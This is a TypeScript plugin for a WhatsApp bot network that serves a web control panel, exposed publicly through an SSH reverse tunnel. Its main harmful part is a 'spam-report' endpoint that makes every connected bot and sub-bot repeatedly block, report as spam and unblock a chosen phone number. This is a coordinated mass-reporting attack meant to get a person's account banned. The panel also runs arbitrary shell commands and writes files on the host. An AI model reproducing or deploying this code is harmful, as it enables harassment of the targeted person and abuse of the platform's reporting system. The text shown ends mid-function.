import type { CommandContext } from "../../types/index.d.ts";
import { fytBold } from "../../core/socketText.ts";
import { getActiveSubBots } from "../../connection/subbotManager.ts";
import * as http from "node:http";
import * as os from "node:os";
import * as fs from "node:fs";
import * as path from "node:path";
import { exec, spawn, type ChildProcess } from "node:child_process";
import { promisify } from "node:util";
import { randomBytes } from "node:crypto";
import { pathToFileURL } from "node:url";

const execAsync = promisify(exec);

interface ReportRecord {
  phone: string;
  totalReports: number;
  subbotsUsed: Set<string>;
  lastTimestamp: string;
}

interface WebPanelState {
  server: http.Server | null;
  port: number;
  token: string;
  tunnelUrl: string | null;
  publicIp: string | null;
  tunnelProcess: ChildProcess | null;
  msgRx: number;
  msgTx: number;
  subbotsPaused: boolean;
  blockedCommands: Set<string>;
  wrappedCommands: Map<string, (...args: any[]) => Promise<any>>;
  hookedSockets: WeakSet<object>;
  originalSenders: WeakMap<object, (...args: any[]) => Promise<any>>;
  reportRegistry: Map<string, ReportRecord>;
  lastSock: any;
}

const gState = globalThis as unknown as { __auraWebPanel?: WebPanelState };

if (!gState.__auraWebPanel) {
  gState.__auraWebPanel = {
    server: null,
    port: 0,
    token: randomBytes(12).toString("hex"),
    tunnelUrl: null,
    publicIp: null,
    tunnelProcess: null,
    msgRx: 0,
    msgTx: 0,
    subbotsPaused: false,
    blockedCommands: new Set<string>(),
    wrappedCommands: new Map(),
    hookedSockets: new WeakSet(),
    originalSenders: new WeakMap(),
    reportRegistry: new Map(),
    lastSock: null,
  };
}

const state = gState.__auraWebPanel!;

function getAllBotSockets(mainSock?: any): any[] {
  const base = mainSock || state.lastSock;
  let subs: any[] = [];
  try {
    if (typeof getActiveSubBots === "function") {
      subs = getActiveSubBots() || [];
    }
  } catch {
    subs = [];
  }
  const combined = [base, ...subs].filter(Boolean);
  const seen = new Set<any>();
  return combined.filter((s) => {
    if (seen.has(s)) return false;
    seen.add(s);
    return true;
  });
}

function hookSockets(mainSock?: any) {
  if (mainSock) state.lastSock = mainSock;
  const sockets = getAllBotSockets(mainSock);

  sockets.forEach((botSock, index) => {
    if (!botSock || typeof botSock !== "object") return;

    if (!state.hookedSockets.has(botSock)) {
      state.hookedSockets.add(botSock);

      if (botSock.ev && typeof botSock.ev.on === "function") {
        botSock.ev.on("messages.upsert", ({ messages }: any) => {
          if (!Array.isArray(messages)) return;
          for (const m of messages) {
            if (!m?.message) continue;
            if (m.key?.fromMe) state.msgTx++;
            else state.msgRx++;
          }
        });
      }

      if (typeof botSock.sendMessage === "function") {
        const origSend = botSock.sendMessage.bind(botSock);
        state.originalSenders.set(botSock, origSend);

        botSock.sendMessage = async (...args: any[]) => {
          const isSub = Boolean(botSock.isSubBot || index > 0);
          if (state.subbotsPaused && isSub) {
            return undefined;
          }
          state.msgTx++;
          return origSend(...args);
        };
      }
    }
  });
}

async function syncCommandInterceptors() {
  const cmdRoot = path.resolve(process.cwd(), "cmd");
  if (!fs.existsSync(cmdRoot)) return [];

  const allCmdNames: string[] = [];
  const categories = fs.readdirSync(cmdRoot, { withFileTypes: true });

  for (const cat of categories) {
    if (!cat.isDirectory()) continue;
    const catDir = path.join(cmdRoot, cat.name);
    const files = fs.readdirSync(catDir).filter((f) => f.endsWith(".ts") || f.endsWith(".js"));

    for (const file of files) {
      const fullPath = path.join(catDir, file);
      try {
        const mod = await import(pathToFileURL(fullPath).href);
        const plugin = mod?.default;
        if (!plugin || typeof plugin.run !== "function") continue;

        const names: string[] = Array.isArray(plugin.name) ? plugin.name : [String(plugin.name || "")];
        const primaryName = names[0];
        if (!primaryName) continue;

        names.forEach((n) => {
          if (n) allCmdNames.push(n.toLowerCase());
        });

        if (!state.wrappedCommands.has(fullPath)) {
          const originalRun = plugin.run.bind(plugin);
          state.wrappedCommands.set(fullPath, originalRun);

          plugin.run = async (ctx: CommandContext) => {
            const invoked = String(ctx.cmdName || primaryName).toLowerCase();
            const isBlocked =
              state.blockedCommands.has(invoked) ||
              names.some((alias) => state.blockedCommands.has(alias.toLowerCase()));

            if (isBlocked) {
              return ctx.reply(
                `🛠️ *${fytBold("MANTENIMIENTO ACTIVO")}*\n\nEl comando *${invoked}* se encuentra temporalmente deshabilitado desde el Panel Web.`
              );
            }
            return originalRun(ctx);
          };
        }
      } catch {}
    }
  }

  return Array.from(new Set(allCmdNames)).sort();
}

async function fetchPublicIp(): Promise<string> {
  if (state.publicIp) return state.publicIp;
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = (await res.json()) as { ip?: string };
    if (data?.ip) {
      state.publicIp = data.ip;
      return data.ip;
    }
  } catch {}
  return "127.0.0.1";
}

function startPublicTunnel(port: number): Promise<string | null> {
  if (state.tunnelUrl && state.tunnelProcess && !state.tunnelProcess.killed) {
    return Promise.resolve(state.tunnelUrl);
  }

  return new Promise((resolve) => {
    let resolved = false;
    const finish = (url: string | null) => {
      if (!resolved) {
        resolved = true;
        resolve(url);
      }
    };

    try {
      const sshProc = spawn(
        "ssh",
        [
          "-o",
          "StrictHostKeyChecking=no",
          "-o",
          "UserKnownHostsFile=/dev/null",
          "-o",
          "ServerAliveInterval=30",
          "-R",
          `80:127.0.0.1:${port}`,
          "nokey@localhost.run",
        ],
        { stdio: ["ignore", "pipe", "pipe"] }
      );

      state.tunnelProcess = sshProc;

      const parseChunk = (chunk: Buffer) => {
        const text = chunk.toString("utf8");
        const match = text.match(/https:\/\/[a-zA-Z0-9.-]+\.(?:lhr\.life|localhost\.run)/);
        if (match && match[0]) {
          state.tunnelUrl = match[0];
          finish(match[0]);
        }
      };

      sshProc.stdout?.on("data", parseChunk);
      sshProc.stderr?.on("data", parseChunk);

      sshProc.on("error", () => finish(null));
      sshProc.on("exit", () => {
        state.tunnelUrl = null;
        finish(null);
      });

      setTimeout(() => finish(state.tunnelUrl), 4500);
    } catch {
      finish(null);
    }
  });
}

async function readJsonBody(req: http.IncomingMessage): Promise<any> {
  return new Promise((resolve) => {
    let raw = "";
    req.on("data", (chunk) => {
      raw += chunk.toString("utf8");
      if (raw.length > 5 * 1024 * 1024) req.destroy();
    });
    req.on("end", () => {
      try {
        resolve(JSON.parse(raw || "{}"));
      } catch {
        resolve({});
      }
    });
    req.on("error", () => resolve({}));
  });
}

function sendJson(res: http.ServerResponse, status: number, payload: any) {
  const data = JSON.stringify(payload);
  res.writeHead(status, {
    "Content-Type": "application/json; charset=utf-8",
    "Access-Control-Allow-Origin": "*",
    "Cache-Control": "no-store",
  });
  res.end(data);
}

function safeResolvePath(relPath: string): string {
  const root = process.cwd();
  const target = path.resolve(root, relPath || ".");
  if (!target.startsWith(root)) return root;
  return target;
}

function buildDashboardHtml(token: string): string {
  return `<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Aura-Bot 2.0 | Control Center</title>
<style>
  :root {
    --bg: #07090e;
    --panel: #10141f;
    --border: #1e2638;
    --accent: #00e5ff;
    --accent2: #7c4dff;
    --danger: #ff2a54;
    --success: #00e676;
    --warn: #ffab00;
    --text: #e2e8f0;
    --muted: #8b9bb4;
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { background: var(--bg); color: var(--text); font-family: system-ui, -apple-system, sans-serif; padding-bottom: 40px; }
  header { background: var(--panel); border-bottom: 1px solid var(--border); padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 50; }
  .brand { font-size: 18px; font-weight: 800; color: var(--accent); letter-spacing: 0.5px; display: flex; align-items: center; gap: 10px; }
  .badge { background: rgba(0,229,255,0.12); color: var(--accent); border: 1px solid var(--accent); padding: 4px 10px; border-radius: 999px; font-size: 12px; font-weight: 600; }
  .tabs { display: flex; gap: 8px; padding: 14px 24px; overflow-x: auto; border-bottom: 1px solid var(--border); background: #0b0e17; }
  .tab-btn { background: var(--panel); color: var(--muted); border: 1px solid var(--border); padding: 8px 16px; border-radius: 8px; cursor: pointer; font-weight: 600; font-size: 13px; white-space: nowrap; transition: 0.2s; }
  .tab-btn.active, .tab-btn:hover { color: var(--text); border-color: var(--accent); background: rgba(0,229,255,0.08); }
  .container { max-width: 1280px; margin: 20px auto; padding: 0 20px; }
  .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 14px; margin-bottom: 20px; }
  .card { background: var(--panel); border: 1px solid var(--border); border-radius: 12px; padding: 16px; }
  .card-title { font-size: 12px; color: var(--muted); text-transform: uppercase; margin-bottom: 8px; font-weight: 700; }
  .card-val { font-size: 24px; font-weight: 800; color: var(--text); }
  .card-sub { font-size: 12px; color: var(--accent); margin-top: 4px; }
  .section { display: none; }
  .section.active { display: block; }
  table { width: 100%; border-collapse: collapse; font-size: 13px; }
  th, td { text-align: left; padding: 10px 12px; border-bottom: 1px solid var(--border); }
  th { color: var(--muted); font-weight: 600; text-transform: uppercase; font-size: 11px; }
  .btn { background: var(--accent); color: #000; border: none; padding: 8px 14px; border-radius: 6px; font-weight: 700; cursor: pointer; font-size: 12px; transition: 0.15s; }
  .btn:hover { opacity: 0.88; }
  .btn-danger { background: var(--danger); color: #fff; }
  .btn-warn { background: var(--warn); color: #000; }
  .btn-success { background: var(--success); color: #000; }
  input, select, textarea { background: #07090e; color: var(--text); border: 1px solid var(--border); border-radius: 6px; padding: 8px 12px; font-size: 13px; width: 100%; }
  textarea { font-family: monospace; min-height: 340px; resize: vertical; }
  .flex-row { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; margin-bottom: 14px; }
  .pill { display: inline-block; padding: 3px 8px; border-radius: 6px; font-size: 11px; font-weight: 700; }
  .pill-on { background: rgba(0,230,118,0.15); color: var(--success); }
  .pill-off { background: rgba(255,42,84,0.15); color: var(--danger); }
  .cmd-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 8px; margin-top: 12px; }
  .cmd-item { background: #0b0e17; border: 1px solid var(--border); padding: 8px 10px; border-radius: 8px; display: flex; justify-content: space-between; align-items: center; font-size: 12px; }
  pre { background: #05070b; border: 1px solid var(--border); padding: 12px; border-radius: 8px; overflow-x: auto; font-size: 12px; color: #00e676; max-height: 320px; }
</style>
</head>
<body>
<header>
  <div class="brand">⚡ AURA-BOT 2.0 // WEB TELEMETRY</div>
  <div class="badge" id="uptimeBadge">Conectando...</div>
</header>

<div class="tabs">
  <button class="tab-btn active" onclick="switchTab('dash', this)">📊 Dashboard & Subbots</button>
  <button class="tab-btn" onclick="switchTab('procs', this)">💀 Procesos & RAM</button>
  <button class="tab-btn" onclick="switchTab('cmds', this)">🛠️ Mantenimiento Comandos</button>
  <button class="tab-btn" onclick="switchTab('spam', this)">🚨 Registro Reportes / Spam</button>
  <button class="tab-btn" onclick="switchTab('files', this)">📁 Archivos & Editor</button>
  <button class="tab-btn" onclick="switchTab('bench', this)">⚡ Benchmark & Terminal</button>
</div>

<div class="container">
  <div id="tab-dash" class="section active">
    <div class="grid">
      <div class="card"><div class="card-title">Subbots Conectados</div><div class="card-val" id="mSubbots">0</div><div class="card-sub" id="mSubState">Estado: Activos</div></div>
      <div class="card"><div class="card-title">Tráfico de Mensajes</div><div class="card-val" id="mMsgs">0 / 0</div><div class="card-sub">Recibidos (RX) / Enviados (TX)</div></div>
      <div class="card"><div class="card-title">Grupos Activos</div><div class="card-val" id="mGroups">0</div><div class="card-sub">Sincronizados en red</div></div>
      <div class="card"><div class="card-title">Memoria RAM (RSS / Heap)</div><div class="card-val" id="mRam">0 MB</div><div class="card-sub" id="mCpu">CPU Load: 0.00</div></div>
    </div>

    <div class="card" style="margin-bottom: 20px;">
      <div class="flex-row" style="justify-content: space-between;">
        <h3>🤖 Control Global de Instancias (Main + Subbots)</h3>
        <div class="flex-row" style="margin:0;">
          <button class="btn btn-warn" onclick="togglePauseSubbots()" id="btnPauseSubs">⏸️ Pausar Todos los Subbots</button>
          <button class="btn btn-success" onclick="cleanRam()">🧹 Limpiar RAM</button>
        </div>
      </div>
      <table>
        <thead><tr><th>Instancia</th><th>JID / Número</th><th>Nombre</th><th>Estado</th><th>Rol</th></tr></thead>
        <tbody id="subbotsTable"></tbody>
      </table>
    </div>
  </div>

  <div id="tab-procs" class="section">
    <div class="card">
      <div class="flex-row" style="justify-content: space-between;">
        <h3>💀 Gestor de Procesos del Servidor y Limpieza de Memoria</h3>
        <div class="flex-row" style="margin:0;">
          <input type="text" id="multiPidInput" placeholder="PIDs separados por coma (ej: 1204, 1502)" style="width:260px;">
          <button class="btn btn-danger" onclick="killMultiplePids()">Matar Seleccionados</button>
          <button class="btn btn-success" onclick="cleanRam()">Forzar Garbage Collector / RAM</button>
        </div>
      </div>
      <table>
        <thead><tr><th>PID</th><th>Comando</th><th>% CPU</th><th>% MEM</th><th>Acción</th></tr></thead>
        <tbody id="procsTable"></tbody>
      </table>
    </div>
  </div>

  <div id="tab-cmds" class="section">
    <div class="card">
      <h3>🛠️ Bloqueador de Comandos por Mantenimiento</h3>
      <p style="font-size:13px; color:var(--muted); margin: 6px 0 14px;">Bloquea o desbloquea cualquier comando en caliente sin reiniciar el bot.</p>
      <div class="flex-row">
        <input type="text" id="customCmdInput" placeholder="Nombre del comando (ej: play, sticker, lid)" style="max-width:300px;">
        <button class="btn btn-danger" onclick="toggleCmdManual()">Alternar Estado</button>
      </div>
      <div class="cmd-grid" id="cmdGrid"></div>
    </div>
  </div>

  <div id="tab-spam" class="section">
    <div class="card" style="margin-bottom: 20px;">
      <h3>🚨 Centro de Control y Auditoría de Reportes / Spam</h3>
      <p style="font-size:13px; color:var(--muted); margin: 6px 0 14px;">Ejecuta o audita cuántas veces un número ha sido reportado y cuántos subbots participaron.</p>
      <div class="flex-row">
        <input type="text" id="spamTarget" placeholder="Número con prefijo (ej: 573001234567)" style="max-width:280px;">
        <input type="number" id="spamCycles" value="5" min="1" max="20" style="max-width:120px;" title="Ciclos por bot">
        <button class="btn btn-danger" onclick="runSpamReport()">🚀 Ejecutar Reporte con Subbots</button>
      </div>
      <table>
        <thead><tr><th>Número Objetivo</th><th>Veces Reportado</th><th>Subbots Ejecutores</th><th>Último Registro</th></tr></thead>
        <tbody id="spamTable"></tbody>
      </table>
    </div>
  </div>

  <div id="tab-files" class="section">
    <div class="card">
      <h3>📁 Explorador y Editor de Archivos en Vivo</h3>
      <div class="flex-row" style="margin-top:10px;">
        <input type="text" id="currentDirInput" value="." style="max-width:350px;">
        <button class="btn" onclick="loadDir()">📂 Listar Carpeta</button>
      </div>
      <div id="fileList" style="display:flex; gap:8px; flex-wrap:wrap; margin-bottom:14px;"></div>
      <div class="flex-row" style="justify-content: space-between;">
        <input type="text" id="editingFilePath" placeholder="Ruta del archivo abierto..." readonly style="max-width:450px;">
        <button class="btn btn-success" onclick="saveFileContent()">💾 Guardar Archivo</button>
      </div>
      <textarea id="fileEditor" placeholder="Selecciona un archivo para ver o editar su código..."></textarea>
    </div>
  </div>

  <div id="tab-bench" class="section">
    <div class="card">
      <h3>⚡ Benchmark V8 y Consola de Test Rápido</h3>
      <div class="flex-row" style="margin-top:12px;">
        <button class="btn" onclick="runBenchmark()">🔥 Ejecutar Benchmark CPU / RAM / Disco</button>
      </div>
      <pre id="benchOutput">Pulsa el botón para iniciar la prueba de rendimiento...</pre>
      <h3 style="margin-top:20px;">💻 Consola de Diagnóstico (Shell Test)</h3>
      <div class="flex-row" style="margin-top:10px;">
        <input type="text" id="shellCmdInput" placeholder="Comando de diagnóstico (ej: uname -a, df -h, free -m)" style="max-width:450px;">
        <button class="btn btn-warn" onclick="runShellTest()">Ejecutar Test</button>
      </div>
      <pre id="shellOutput">Esperando instrucción...</pre>
    </div>
  </div>
</div>

<script>
const TOKEN = "${token}";

function switchTab(id, btn) {
  document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
  document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
  document.getElementById('tab-' + id).classList.add('active');
  btn.classList.add('active');
  if (id === 'files') loadDir();
  if (id === 'cmds') loadCommands();
}

async function api(path, method = 'GET', body = null) {
  const opts = { method, headers: { 'Content-Type': 'application/json', 'x-aura-token': TOKEN } };
  if (body) opts.body = JSON.stringify(body);
  const r = await fetch('/api/' + path + '?token=' + TOKEN, opts);
  return r.json();
}

async function refreshTelemetry() {
  try {
    const d = await api('status');
    document.getElementById('uptimeBadge').textContent = '⏱️ Uptime: ' + d.uptime;
    document.getElementById('mSubbots').textContent = d.subbots.length;
    document.getElementById('mSubState').textContent = d.subbotsPaused ? '⏸️ PAUSADOS' : '🟢 OPERANDO';
    document.getElementById('btnPauseSubs').textContent = d.subbotsPaused ? '▶️ Reanudar Todos los Subbots' : '⏸️ Pausar Todos los Subbots';
    document.getElementById('mMsgs').textContent = d.msgRx + ' / ' + d.msgTx;
    document.getElementById('mGroups').textContent = d.groupsCount;
    document.getElementById('mRam').textContent = d.ramRss + ' MB / ' + d.ramHeap + ' MB';
    document.getElementById('mCpu').textContent = 'CPU Load: ' + d.loadAvg;

    const sbHtml = d.subbots.map((s, i) => \`<tr>
      <td>#\${i + 1}</td>
      <td><code>\${s.id}</code></td>
      <td>\${s.name}</td>
      <td><span class="pill \${s.paused ? 'pill-off' : 'pill-on'}">\${s.paused ? 'PAUSADO' : 'ONLINE'}</span></td>
      <td>\${s.role}</td>
    </tr>\`).join('');
    document.getElementById('subbotsTable').innerHTML = sbHtml;

    const prHtml = d.processes.map(p => \`<tr>
      <td><code>\${p.pid}</code></td>
      <td>\${p.comm}</td>
      <td>\${p.cpu}%</td>
      <td>\${p.mem}%</td>
      <td><button class="btn btn-danger" onclick="killPid('\${p.pid}')">Matar</button></td>
    </tr>\`).join('');
    document.getElementById('procsTable').innerHTML = prHtml;

    const spHtml = d.reports.length ? d.reports.map(r => \`<tr>
      <td><code>+\${r.phone}</code></td>
      <td><b>\${r.totalReports}</b> veces</td>
      <td>\${r.subbotsCount} instancias</td>
      <td>\${r.lastTimestamp}</td>
    </tr>\`).join('') : '<tr><td colspan="4" style="color:var(--muted)">Sin reportes registrados aún.</td></tr>';
    document.getElementById('spamTable').innerHTML = spHtml;
  } catch (e) {}
}

async function togglePauseSubbots() {
  await api('toggle-subbots', 'POST', {});
  refreshTelemetry();
}

async function cleanRam() {
  const r = await api('clean-ram', 'POST', {});
  alert('Limpieza completada. Memoria actual: ' + r.afterMb + ' MB');
  refreshTelemetry();
}

async function killPid(pid) {
  await api('kill-proc', 'POST', { pids: [pid] });
  refreshTelemetry();
}

async function killMultiplePids() {
  const raw = document.getElementById('multiPidInput').value;
  const pids = raw.split(',').map(s => s.trim()).filter(Boolean);
  if (!pids.length) return;
  await api('kill-proc', 'POST', { pids });
  document.getElementById('multiPidInput').value = '';
  refreshTelemetry();
}

async function loadCommands() {
  const d = await api('commands');
  const html = d.allCommands.map(c => {
    const blocked = d.blocked.includes(c);
    return \`<div class="cmd-item">
      <span>.\${c}</span>
      <button class="btn \${blocked ? 'btn-danger' : 'btn-success'}" onclick="toggleCmd('\${c}')">\${blocked ? 'Bloqueado' : 'Activo'}</button>
    </div>\`;
  }).join('');
  document.getElementById('cmdGrid').innerHTML = html;
}

async function toggleCmd(cmd) {
  await api('toggle-cmd', 'POST', { cmd });
  loadCommands();
}

async function toggleCmdManual() {
  const val = document.getElementById('customCmdInput').value.trim().replace(/^[.#/]/, '');
  if (!val) return;
  await toggleCmd(val);
  document.getElementById('customCmdInput').value = '';
}

async function runSpamReport() {
  const phone = document.getElementById('spamTarget').value.trim();
  const cycles = parseInt(document.getElementById('spamCycles').value, 10) || 5;
  if (!phone) return alert('Ingresa un número válido');
  await api('spam-report', 'POST', { phone, cycles });
  document.getElementById('spamTarget').value = '';
  refreshTelemetry();
}

async function loadDir(customDir) {
  const dirInput = document.getElementById('currentDirInput');
  if (customDir) dirInput.value = customDir;
  const d = await api('files?dir=' + encodeURIComponent(dirInput.value));
  if (!d.entries) return;
  const html = d.entries.map(e => {
    if (e.isDir) {
      return \`<button class="tab-btn" onclick="loadDir('\${e.relPath}')">📁 \${e.name}</button>\`;
    }
    return \`<button class="tab-btn" onclick="openFile('\${e.relPath}')">📄 \${e.name}</button>\`;
  }).join('');
  document.getElementById('fileList').innerHTML = html;
}

async function openFile(relPath) {
  const d = await api('file-read?file=' + encodeURIComponent(relPath));
  document.getElementById('editingFilePath').value = d.file || relPath;
  document.getElementById('fileEditor').value = d.content || '';
}

async function saveFileContent() {
  const file = document.getElementById('editingFilePath').value;
  const content = document.getElementById('fileEditor').value;
  if (!file) return alert('Ningún archivo seleccionado');
  const r = await api('file-save', 'POST', { file, content });
  alert(r.ok ? 'Archivo guardado correctamente' : 'Error al guardar');
}

async function runBenchmark() {
  document.getElementById('benchOutput').textContent = 'Ejecutando pruebas de estrés en CPU, Memoria y Disco...';
  const r = await api('benchmark', 'POST', {});
  document.getElementById('benchOutput').textContent = r.result;
}

async function runShellTest() {
  const cmd = document.getElementById('shellCmdInput').value.trim();
  if (!cmd) return;
  document.getElementById('shellOutput').textContent = 'Ejecutando...';
  const r = await api('shell-test', 'POST', { cmd });
  document.getElementById('shellOutput').textContent = r.output;
}

refreshTelemetry();
setInterval(refreshTelemetry, 3000);
</script>
</body>
</html>`;
}

async function ensureWebServerRunning(): Promise<number> {
  if (state.server && state.port > 0) {
    return state.port;
  }

  const server = http.createServer(async (req, res) => {
    try {
      const parsedUrl = new URL(req.url || "/", "http://127.0.0.1");
      const queryToken = parsedUrl.searchParams.get("token") || req.headers["x-aura-token"];

      if (queryToken !== state.token) {
        res.writeHead(401, { "Content-Type": "text/plain; charset=utf-8" });
        res.end("401 Unauthorized - Token de propietario invalido.");
        return;
      }

      const pathname = parsedUrl.pathname;

      if (pathname === "/" && req.method === "GET") {
        const html = buildDashboardHtml(state.token);
        res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
        res.end(html);
        return;
      }

      if (pathname === "/api/status" && req.method === "GET") {
        const allBots = getAllBotSockets();
        const subbots = allBots.map((b, idx) => ({
          id: String(b?.user?.id || "Desconocido").split("@")[0].split(":")[0],
          name: b?.user?.name || (idx === 0 ? "MainBot" : `SubBot-${idx}`),
          role: idx === 0 && !b?.isSubBot ? "Principal" : "SubBot",
          paused: idx > 0 ? state.subbotsPaused : false,
        }));

        let groupsCount = 0;
        const main = state.lastSock;
        if (main && typeof main.groupFetchAllParticipating === "function") {
          try {
            const gObj = await main.groupFetchAllParticipating();
            groupsCount = Object.keys(gObj || {}).length;
          } catch {}
        }

        const processes: Array<{ pid: string; comm: string; cpu: string; mem: string }> = [];
        try {
          const { stdout } = await execAsync("ps -eo pid,comm,%cpu,%mem --sort=-%mem | head -n 16");
          const lines = stdout.trim().split("\n").slice(1);
          for (const line of lines) {
            const parts = line.trim().split(/\s+/);
            if (parts.length >= 4) {
              processes.push({
                pid: parts[0],
                comm: parts.slice(1, parts.length - 2).join(" "),
                cpu: parts[parts.length - 2],
                mem: parts[parts.length - 1],
              });
            }
          }
        } catch {}

        const mem = process.memoryUsage();
        const uptimeSec = Math.floor(process.uptime());
        const h = Math.floor(uptimeSec / 3600);
        const m = Math.floor((uptimeSec % 3600) / 60);
        const s = uptimeSec % 60;

        const reports = Array.from(state.reportRegistry.values()).map((r) => ({
          phone: r.phone,
          totalReports: r.totalReports,
          subbotsCount: r.subbotsUsed.size,
          lastTimestamp: r.lastTimestamp,
        }));

        sendJson(res, 200, {
          uptime: `${h}h ${m}m ${s}s`,
          subbots,
          subbotsPaused: state.subbotsPaused,
          msgRx: state.msgRx,
          msgTx: state.msgTx,
          groupsCount,
          ramRss: (mem.rss / 1024 / 1024).toFixed(1),
          ramHeap: (mem.heapUsed / 1024 / 1024).toFixed(1),
          loadAvg: os.loadavg().map((n) => n.toFixed(2)).join(", "),
          processes,
          reports,
        });
        return;
      }

      if (pathname === "/api/toggle-subbots" && req.method === "POST") {
        state.subbotsPaused = !state.subbotsPaused;
        sendJson(res, 200, { paused: state.subbotsPaused });
        return;
      }

      if (pathname === "/api/clean-ram" && req.method === "POST") {
        try {
          if (typeof globalThis.gc === "function") {
            globalThis.gc();
          }
        } catch {}
        const afterMb = (process.memoryUsage().rss / 1024 / 1024).toFixed(1);
        sendJson(res, 200, { ok: true, afterMb });
        return;
      }

      if (pathname === "/api/kill-proc" && req.method === "POST") {
        const body = await readJsonBody(req);
        const pids: string[] = Array.isArray(body.pids) ? body.pids : [];
        const killed: string[] = [];
        for (const p of pids) {
          const numPid = parseInt(String(p), 10);
          if (!isNaN(numPid) && numPid > 1 && numPid !== process.pid) {
            try {
              process.kill(numPid, "SIGKILL");
              killed.push(String(numPid));
            } catch {}
          }
        }
        sendJson(res, 200, { ok: true, killed });
        return;
      }

      if (pathname === "/api/commands" && req.method === "GET") {
        const allCommands = await syncCommandInterceptors();
        sendJson(res, 200, {
          allCommands,
          blocked: Array.from(state.blockedCommands),
        });
        return;
      }

      if (pathname === "/api/toggle-cmd" && req.method === "POST") {
        const body = await readJsonBody(req);
        const cmd = String(body.cmd || "").toLowerCase().trim();
        if (cmd) {
          await syncCommandInterceptors();
          if (state.blockedCommands.has(cmd)) {
            state.blockedCommands.delete(cmd);
          } else {
            state.blockedCommands.add(cmd);
          }
        }
        sendJson(res, 200, { blocked: Array.from(state.blockedCommands) });
        return;
      }

      if (pathname === "/api/spam-report" && req.method === "POST") {
        const body = await readJsonBody(req);
        const cleanPhone = String(body.phone || "").replace(/\D/g, "");
        const cycles = Math.min(20, Math.max(1, parseInt(String(body.cycles || "3"), 10)));

        if (!cleanPhone || cleanPhone.length < 7) {
          sendJson(res, 400, { ok: false });
          return;
        }

        const targetJid = `${cleanPhone}@s.whatsapp.net`;
        const allBots = getAllBotSockets();

        if (!state.reportRegistry.has(cleanPhone)) {
          state.reportRegistry.set(cleanPhone, {
            phone: cleanPhone,
            totalReports: 0,
            subbotsUsed: new Set(),
            lastTimestamp: new Date().toLocaleTimeString("es-CO"),
          });
        }

        const entry = state.reportRegistry.get(cleanPhone)!;

        await Promise.allSettled(
          allBots.map(async (botSock, idx) => {
            const botId = String(botSock?.user?.id || `Bot-${idx}`).split("@")[0];
            entry.subbotsUsed.add(botId);

            for (let i = 0; i < cycles; i++) {
              try {
                if (typeof botSock.updateBlockStatus === "function") {
                  await botSock.updateBlockStatus(targetJid, "block").catch(() => {});
                }
                if (typeof botSock.query === "function") {
                  await botSock
                    .query({
                      tag: "iq",
                      attrs: { to: "@s.whatsapp.net", type: "set", xmlns: "disallowed" },
                      content: [{ tag: "report", attrs: { jid: targetJid, type: "spam" } }],
                    })
                    .catch(() => {});
                }
                entry.totalReports++;
                entry.lastTimestamp = new Date().toLocaleTimeString("es-CO");
                if (typeof botSock.updateBlockStatus === "function") {
                  await botSock.updateBlockStatus(targetJid, "unblock").catch(() => {});
                }
              } catch {}
            }
          })
        );

        sendJson(res, 200, { ok: true });
        return;
      }

      if (pathname === "/api/files" && req.method === "GET") {
        const relDir = parsedUrl.searchParams.get("dir") || ".";
        const targetDir = safeResolvePath(relDir);
        const items = fs.readdirSync(targetDir, { withFileTypes: true });
        const entries = items
          .filter((i) => i.name !== "node_modules" && i.name !== ".git")
          .map((i) => ({
            name: i.name,
            isDir: i.isDirectory(),
            relPath: path.relative(process.cwd(), path.join(targetDir, i.name)) || ".",
          }))
          .sort((a, b) => Number(b.isDir) - Number(a.isDir));

        sendJson(res, 200, { entries });
        return;
      }

      if (pathname === "/api/file-read" && req.method === "GET") {
        const relFile = parsedUrl.searchParams.get("file") || "";
        const targetFile = safeResolvePath(relFile);
        if (fs.existsSync(targetFile) && fs.statSync(targetFile).isFile()) {
          const content = fs.readFileSync(targetFile, "utf8");
          sendJson(res, 200, { file: relFile, content });
          return;
        }
        sendJson(res, 404, { error: "Archivo no encontrado" });
        return;
      }

      if (pathname === "/api/file-save" && req.method === "POST") {
        const body = await readJsonBody(req);
        const relFile = String(body.file || "");
        const content = String(body.content ?? "");
        const targetFile = safeResolvePath(relFile);
        fs.writeFileSync(targetFile, content, "utf8");
        sendJson(res, 200, { ok: true });
        return;
      }

      if (pathname === "/api/benchmark" && req.method === "POST") {
        const t0 = performance.now();
        let acc = 0;
        for (let i = 0; i < 5_000_000; i++) {
          acc += Math.sqrt(i);
        }
        const cpuMs = (performance.now() - t0).toFixed(2);

        const t1 = performance.now();
        const buf = Buffer.alloc(32 * 1024 * 1024, 0xaa);
        const memMs = (performance.now() - t1).toFixed(2);

        const tmpFile = path.join(os.tmpdir(), `aura_bench_${Date.now()}.tmp`);
        const t2 = performance.now();
        fs.writeFileSync(tmpFile, buf);
        fs.readFileSync(tmpFile);
        fs.unlinkSync(tmpFile);
        const diskMs = (performance.now() - t2).toFixed(2);

        const summary = [
          `=== AURA-BOT V8 BENCHMARK ===`,
          `CPU Math (5M ops)     : ${cpuMs} ms (Checksum: ${acc.toFixed(0)})`,
          `RAM Alloc (32 MB)     : ${memMs} ms`,
          `Disk R/W (32 MB I/O)  : ${diskMs} ms`,
          `Sistema Operativo     : ${os.type()} ${os.release()} (${os.arch()})`,
          `Hilos / Núcleos CPU   : ${os.cpus().length} vCPU (${os.cpus()[0]?.model || "Generic"})`,
        ].join("\n");

        sendJson(res, 200, { result: summary });
        return;
      }

      if (pathname === "/api/shell-test" && req.method === "POST") {
        const body = await readJsonBody(req);
        const cmd = String(body.cmd || "uptime");
        try {
          const { stdout, stderr } = await execAsync(cmd, { timeout: 8000 });
          sendJson(res, 200, { output: (stdout || stderr || "Ejecutado sin salida.").slice(0, 4000) });
        } catch (err: any) {
          sendJson(res, 200, { output: String(err?.message || err).slice(0, 4000) });
        }
        return;
      }

      sendJson(res, 404, { error: "Ruta no encontrada" });
    } catch (e: any) {
      sendJson(res, 500, { error: String(e?.message || e) });
    }
  });

